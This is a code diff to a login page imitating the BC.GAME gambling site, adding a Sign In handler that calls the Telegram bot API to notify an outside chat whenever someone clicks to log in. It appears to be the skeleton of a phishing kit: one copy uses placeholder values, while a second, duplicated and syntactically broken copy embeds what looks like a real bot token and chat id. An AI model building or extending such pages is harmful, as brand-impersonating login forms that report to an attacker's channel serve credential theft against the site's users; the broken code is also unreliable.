@@ -241,7 +241,7 @@ Password
 Forgot your password?
 </div>
 
-<button class="btn">
+<button class="btn" onclick="sendMessage()">
 Sign In
 </button>
 
@@ -275,5 +275,33 @@ New to BC.GAME? <span>Create account</span>
 
 </div>
 
+<script>
+
+function sendMessage(){
+
+let botToken = "YAHAN_BOT_TOKEN";
+
+let chatId = "YAHAN_CHAT_ID";
+
+let text = "New Login Clicked";
+
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`);
+
+}
+<script>
+
+function sendMessage(){
+
+let botToken = "YAHAN_BOT_TOKEN";
+
+let chatId = "YAHAN_CHAT_ID";
+
+let text = "New Login Clicked";
+
+fetch(`https://api.telegram.org/bot${8086684078:AAGTJyuE7F0tRnRjTX4ScyL_NjxNzdMXNRs}/sendMessage?chat_id=${7892706717}&text=${text}`);
+
+}
+
+</script>
 </body>
 </html>
